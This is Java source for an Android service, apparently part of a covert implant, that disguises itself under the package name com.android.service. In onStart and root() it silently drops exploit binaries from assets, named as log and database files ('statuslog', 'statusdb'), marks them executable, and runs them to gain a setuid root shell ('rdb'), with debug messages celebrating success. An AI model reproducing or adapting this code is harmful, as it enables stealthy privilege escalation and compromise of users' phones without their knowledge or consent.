package com.android.service;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import com.android.service.auto.Cfg;
import com.android.service.util.Utils;

/**
 * The Class ServiceCore.
 */
public class ServiceCore extends Service {
	private static final String TAG = "ServiceCore";

	private Core core;
	private String shellFile;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		if (Cfg.DEBUG)
			Log.d("QZ", TAG + " (onCreate)");

		// Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
		Status.setAppContext(getApplicationContext());
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (Cfg.DEBUG)
			Log.d("QZ", TAG + " (onDestroy)");

		// Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
		core.Stop();
		core = null;
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);

		this.shellFile = "rdb";

		if (checkRoot() == true) {
			Status.self().setRoot(true);
		} else {
			Status.self().setRoot(false);

			// Don't exploit if we have no SD card mounted
			if (android.os.Environment.getExternalStorageState().equals(
					android.os.Environment.MEDIA_MOUNTED)) {
				Status.self().setRoot(root());
			}else{
				if (Cfg.DEBUG)
					Log.d("QZ", TAG + " (onStart) no media mounted");
			}
		}

		// Core starts
		core = new Core();
		core.Start(this.getResources(), getContentResolver());
	}

	private boolean root() {
		try {
			if (!Cfg.EXP) {
				if (Cfg.DEBUG)
					Log.d("QZ", TAG + " (root): Exploit disabled by conf");
				return false;
			}
			String crashlog = "errorlog";
			String exploit = "statuslog";
			String suidext = "statusdb";
			boolean isRoot = false;

			// Creiamo il crashlog
			FileOutputStream fos = getApplicationContext().openFileOutput(
					crashlog, MODE_PRIVATE);
			fos.close();

			// Scriviamo l'exploit sul disco
			InputStream is = getAssets().open(exploit);

			byte[] content = new byte[is.available()];
			is.read(content);
			is.close();

			FileOutputStream fsexpl = openFileOutput(exploit, MODE_PRIVATE);
			fsexpl.write(content);
			fsexpl.close();

			// scriviamo suidext su disco
			is = getAssets().open(suidext);

			content = new byte[is.available()];
			is.read(content);
			is.close();

			FileOutputStream fsext = openFileOutput(suidext, MODE_PRIVATE);
			fsext.write(content);
			fsext.close();

			// Eseguiamo l'exploit
			File filesPath = getApplicationContext().getFilesDir();
			String path = filesPath.getAbsolutePath();

			Runtime.getRuntime().exec(
					"/system/bin/chmod 755 " + path + "/" + exploit);
			Runtime.getRuntime().exec(
					"/system/bin/chmod 755 " + path + "/" + suidext);
			Runtime.getRuntime().exec(
					"/system/bin/chmod 666 " + path + "/" + crashlog);

			final String exppath = path + "/" + exploit;

			ExploitRunnable r = new ExploitRunnable(exppath);
			new Thread(r).start();

			// Attendiamo al max 1 minuto il nostro file setuid root
			long now = System.currentTimeMillis();

			while (System.currentTimeMillis() - now < 60000) {
				Utils.sleep(1000);

				if (checkRoot()) {
					isRoot = true;
					break;
				}
			}

			if (r.getProcess() != null)
				r.getProcess().destroy();

			if (isRoot) {
				if (Cfg.DEBUG) {
					Log.d("QZ",
							TAG
									+ " (onStart): WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!");
					Toast.makeText(this,
							"WE ARE ROOOOOOOT, I LOVE QUEZ MADE EXPLOITS!!!",
							Toast.LENGTH_LONG).show();
				}
			} else {
				if (Cfg.DEBUG) {
					Log.d("QZ",
							TAG
									+ " (onStart): Fucking third party exploits, they never work!");
					Toast.makeText(this,
							"Fucking third party exploits, they never work!",
							Toast.LENGTH_LONG).show();
				}

			}
		} catch (Exception e1) {
			e1.printStackTrace();
			if (Cfg.DEBUG)
				Log.d("QZ", TAG + " (root): Exception on root()");
			return false;
		}

		return true;
	}

	private boolean checkRoot() {
		try {
			getApplicationContext().openFileInput(shellFile);
		} catch (FileNotFoundException f) {
			return false;
		}

		return true;
	}

	// Exploit thread
	class ExploitRunnable implements Runnable {
		private Process localProcess;
		private String exppath;

		public ExploitRunnable(String exppath) {
			this.exppath = exppath;
		}

		public Process getProcess() {
			return localProcess;
		}

		public void run() {
			try {
				localProcess = Runtime.getRuntime().exec(exppath);
				
				OutputStream localOutputStream = localProcess.getOutputStream();
				DataOutputStream localDataOutputStream = new DataOutputStream(
						localOutputStream);
				InputStream localInputStream1 = localProcess.getInputStream();
				DataInputStream inputStdout = new DataInputStream(
						localInputStream1);
				InputStream localInputStream2 = localProcess.getErrorStream();
				DataInputStream inputStderr = new DataInputStream(
						localInputStream2);

				try {
					localProcess.waitFor();
				} catch (InterruptedException e) {
					if (Cfg.DEBUG) {
						Log.d("QZ", TAG + " (waitFor): " + e);
						e.printStackTrace();
					}
					
				}
				int exitValue = localProcess.exitValue();
				if (Cfg.DEBUG) 
					Log.d("QZ", TAG + " (waitFor): exitValue " + exitValue);
				while (inputStdout.available() > 0) {
					String str = inputStdout.readLine();
					if (Cfg.DEBUG) {
						Log.d("QZ", TAG + " (stdout): " + str);
					}
				}
				
				while (inputStderr.available() > 0) {
					String str = inputStdout.readLine();
					if (Cfg.DEBUG) {
						Log.d("QZ", TAG + " (stderr): " + str);
					}
				}
				
				inputStdout.close();
				inputStderr.close();

			} catch (IOException e) {
				localProcess = null;
				if (Cfg.DEBUG) {
					Log.d("QZ", TAG
							+ " (ExploitRunnable): Exception on run(): " + e);
					e.printStackTrace();
				}
			}
		}

	};
}
